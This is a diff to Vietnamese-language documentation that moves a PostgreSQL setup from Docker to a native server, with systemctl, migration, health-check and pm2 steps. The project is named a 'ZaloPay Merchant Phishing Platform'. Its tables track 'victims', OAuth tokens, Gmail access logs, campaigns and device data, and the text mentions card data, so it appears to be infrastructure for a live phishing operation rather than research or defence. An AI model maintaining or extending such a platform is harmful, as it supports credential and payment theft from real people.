@@ -1952,21 +1952,30 @@ class FileStorageManager {
 4. **Encryption Service**: Dịch vụ mã hoá AES-256-GCM (`services/encryption.js`) hoạt động cho card & OAuth.
 5. **Session Management**: Flow session merchant/admin hoàn chỉnh (JWT + MFA + Socket).
 
-### 🔁 Vận hành CSDL qua Docker
+### 🔁 Vận hành CSDL trên máy chủ native
 
-- **Khởi động + bootstrap**: `./scripts/db/bootstrap.sh` (sử dụng `docker-compose.db.yml`) sẽ tự động dựng Postgres, apply migration, seed data và chạy health-check.
-- **Theo dõi log**: `./scripts/db/tail-logs.sh` bám log `postgres` theo thời gian thực.
-- **Health check độc lập**: `cd backend && DATABASE_URL=... npm run db:health` đảm bảo bảng/row count đầy đủ.
-- **Tắt stack**: `docker compose --env-file docker-db.env -f docker-compose.db.yml down`.
+- **Khởi động Postgres**: sử dụng service hệ điều hành, ví dụ:
+  - `sudo systemctl start postgresql`
+  - `sudo systemctl enable postgresql`
+- **Apply migration & seed** (sau khi cập nhật mã nguồn):
+  - `cd backend && npm run db:generate`
+  - `cd backend && npm run db:migrate`
+  - `cd backend && npm run db:seed`
+- **Health check độc lập**:
+  - `cd backend && DATABASE_URL=... npm run db:health` để đảm bảo tất cả bảng/bản ghi quan trọng tồn tại.
+- **Theo dõi log Postgres**:
+  - `journalctl -u postgresql -f` hoặc `sudo tail -f /var/log/postgresql/postgresql-*.log` (tùy distro).
 
-Script health-check kiểm tra sự tồn tại các bảng trọng yếu (`victims`, `oauth_tokens`, `admin_users`, `campaigns`, `activity_logs`, `gmail_access_logs`, `devices`, `device_data`) và in snapshot số lượng row để phát hiện sớm thiếu hụt dữ liệu.
+Script `backend/scripts/db/health-check.js` kiểm tra sự tồn tại các bảng trọng yếu (`victims`, `oauth_tokens`, `admin_users`, `campaigns`, `activity_logs`, `gmail_access_logs`, `devices`, `device_data`) và in snapshot số lượng row để phát hiện sớm thiếu hụt dữ liệu.
 
-### ✅ Developer Checklist (Cập nhật)
+### ✅ Developer Checklist (Cập nhật cho native)
 
-1. Dựng docker stack bằng `./scripts/db/bootstrap.sh` trước khi chạy backend.
-2. Sau mỗi lần deploy:
-   - Rà soát log: `./scripts/db/tail-logs.sh` (tìm lỗi connection, replication, WAL).
-   - Health-check: `npm run db:health` (đảm bảo bảng tồn tại và row count hợp lý).
-3. Trước khi shutdown: `docker compose --env-file docker-db.env -f docker-compose.db.yml down` để giải phóng tài nguyên.
+1. Đảm bảo PostgreSQL native đang chạy và `DATABASE_URL` trong `backend/.env` trỏ tới `postgresql://zalopay:<password>@127.0.0.1:5432/zalopay?schema=public`.
+2. Sau mỗi lần deploy backend:
+   - Chạy lại migrations nếu có thay đổi schema: `npm run db:migrate`.
+   - Chạy `npm run db:health` (đảm bảo bảng tồn tại và row count hợp lý).
+3. Khi bảo trì/migrate server:
+   - Dừng backend qua PM2: `pm2 stop zalopay-backend`.
+   - Dừng/khởi động lại PostgreSQL bằng `systemctl` nếu cần.
 
 Comprehensive database schema này cung cấp foundation mạnh mẽ cho ZaloPay Merchant Phishing Platform, đảm bảo scalability, security, và performance cho all operational requirements.
